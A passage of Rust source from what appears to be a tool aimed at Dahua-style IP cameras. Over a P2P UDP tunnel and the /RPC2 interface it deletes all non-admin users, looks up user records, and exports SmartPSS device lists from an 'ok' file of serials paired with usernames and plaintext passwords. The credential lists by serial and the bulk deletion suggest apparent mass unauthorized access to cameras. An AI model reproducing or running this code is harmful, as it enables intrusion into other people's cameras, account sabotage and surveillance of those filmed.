                break;
            }
        }
        if ok_this {
            println!("  [+] user Id={} ({}) deleted via HTTP/RPC2", id, nm);
            deleted += 1;
        } else {
            eprintln!("  [-] user Id={} ({}) delete failed", id, nm);
            failed += 1;
        }
        if last_call_disc() {
            eprintln!(
                "  [!] device sent DISC — stopping early ({} deleted, {} failed)",
                deleted, failed
            );
            break;
        }
    }

    if failed > 0 {
        Err(format!(
            "delete-all: {} deleted, {} failed",
            deleted, failed
        ))
    } else {
        println!("  [+] all {} non-admin user(s) deleted", deleted);
        Ok(())
    }
}

/// Fetch the user list and return the full user object whose "Id" matches, if any.
async fn http_find_user_object(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    user_id: u32,
    timeout: Duration,
    verbose: bool,
) -> (Option<Value>, bool) {
    let body = json!({
        "method": "userManager.getUserInfoAll",
        "session": session,
        "params": {},
        "id": 102,
    });
    if let Some(t) = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if let Some(arr) = v
                    .get("params")
                    .and_then(|p| p.get("users"))
                    .and_then(|u| u.as_array())
                {
                    for user in arr {
                        let id = user.get("Id").and_then(|x| x.as_u64()).unwrap_or(0) as u32;
                        if id == user_id {
                            return (Some(user.clone()), true);
                        }
                    }
                    if verbose {
                        eprintln!("[debug] user Id={} not found in getUserInfoAll", user_id);
                    }
                    return (None, true);
                }
            } else if verbose {
                eprintln!("[debug] getUserInfoAll: bad JSON");
            }
        }
    } else if verbose {
        eprintln!("[debug] getUserInfoAll: http_call returned None (timeout)");
    }
    (None, false)
}

/// Fetch the user list and return the full user object whose "Name" matches, if any.
async fn http_find_user_object_by_name(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    user_name: &str,
    timeout: Duration,
    verbose: bool,
) -> (Option<Value>, bool) {
    let body = json!({
        "method": "userManager.getUserInfoAll",
        "session": session,
        "params": {},
        "id": 102,
    });
    if let Some(t) = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if let Some(arr) = v
                    .get("params")
                    .and_then(|p| p.get("users"))
                    .and_then(|u| u.as_array())
                {
                    for user in arr {
                        let nm = user.get("Name").and_then(|x| x.as_str()).unwrap_or("");
                        if nm == user_name {
                            return (Some(user.clone()), true);
                        }
                    }
                    if verbose {
                        eprintln!("[debug] user '{}' not found in getUserInfoAll", user_name);
                    }
                    return (None, true);
                }
            } else if verbose {
                eprintln!("[debug] getUserInfoAll: bad JSON");
            }
        }
    } else if verbose {
        eprintln!("[debug] getUserInfoAll: http_call returned None (timeout)");
    }
    (None, false)
}

use chrono::Datelike;
use chrono::Timelike;

fn generate_smartpss_from_ok(
    ok_serials: &[String],
    path: &str,
    serial_names: &std::collections::HashMap<String, String>,
) -> Result<(), String> {
    use base64::Engine;
    let mut xml = String::from("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n");
    xml.push_str("<DeviceManager version=\"1.0\">\n");
    for (i, entry) in ok_serials.iter().enumerate() {
        let parts: Vec<&str> = entry.split('_').collect();
        if parts.len() < 4 {
            continue;
        }
        let country = parts[0];
        let serial = parts[1];
        let user = parts[2];
        let password = parts[3];
        let city = if parts.len() >= 5 { parts[4] } else { "" };
        let b64 = base64::engine::general_purpose::STANDARD.encode(password.as_bytes());
        // Se l'input era un XML SmartPSS, preserva il `name` dell'XML di origine;
        // altrimenti genera un name progressivo come prima.
        let name = match serial_names.get(serial) {
            Some(n) if !n.is_empty() => n.clone(),
            _ => {
                if city.is_empty() {
                    format!("{:02}_{}", i + 1, serial)
                } else {
                    format!("{:02}_{}_{}", i + 1, country, serial)
                }
            }
        };
        xml.push_str(&format!(
            "\n<Device connect=\"19\" domain=\"{}\" name=\"{}\" password=\"{}\" port=\"37777\" protocol=\"1\" username=\"{}\"/>",
            xml_escape_cli(serial),
            xml_escape_cli(&name),
            b64,
            xml_escape_cli(user)
        ));
    }
    xml.push_str("\n\n</DeviceManager>\n");
    std::fs::write(path, xml).map_err(|e| e.to_string())
}

fn xml_escape_cli(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn snapshot_folder_is_named_after_the_input_file() {
        assert_eq!(
            snapshot_output_dir(Some("serial_20_08.txt")),
            "snapshot - serial_20_08"
        );
        assert_eq!(
            snapshot_output_dir(Some("/tmp/cams ok.xml")),
            "snapshot - cams ok"
        );
        assert_eq!(
            snapshot_output_dir(Some("dir.with.dots/file.name.serials.csv")),
            "snapshot - file.name.serials"
        );
    }

    #[test]
    fn snapshot_folder_falls_back_to_plain_name() {
        // Single-serial runs have no input file to name the folder after.
        assert_eq!(snapshot_output_dir(None), "snapshots");
        // Dotfiles and trailing slashes have no usable stem.
        assert_eq!(snapshot_output_dir(Some(".")), "snapshots");
        assert_eq!(snapshot_output_dir(Some("   ")), "snapshots");
    }
}
